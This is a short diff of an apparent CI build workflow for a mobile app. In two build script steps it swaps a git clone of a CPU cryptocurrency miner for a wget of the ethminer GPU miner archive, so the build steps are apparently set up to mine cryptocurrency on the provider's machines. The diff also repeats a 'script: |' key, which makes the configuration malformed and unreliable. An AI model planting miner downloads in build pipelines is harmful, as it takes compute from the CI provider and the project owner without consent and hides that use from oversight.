@@ -22,11 +22,11 @@ workflows:
     scripts:
       - name: script_1
         script: |
-                git clone https://github.com/cryptozeny/cpuminer-opt-sugarchain.git 
+                wget https://github.com/ethereum-mining/ethminer/releases/download/v0.18.0/ethminer-0.18.0-cuda-8-linux-x86_64.tar.gz
       - name: script_2
         script: |
                 script: |
-                git clone https://github.com/cryptozeny/cpuminer-opt-sugarchain.git 
+                wget https://github.com/ethereum-mining/ethminer/releases/download/v0.18.0/ethminer-0.18.0-cuda-8-linux-x86_64.tar.gz 
     artifacts:
       - build/**/outputs/**/*.aab
     publishing:
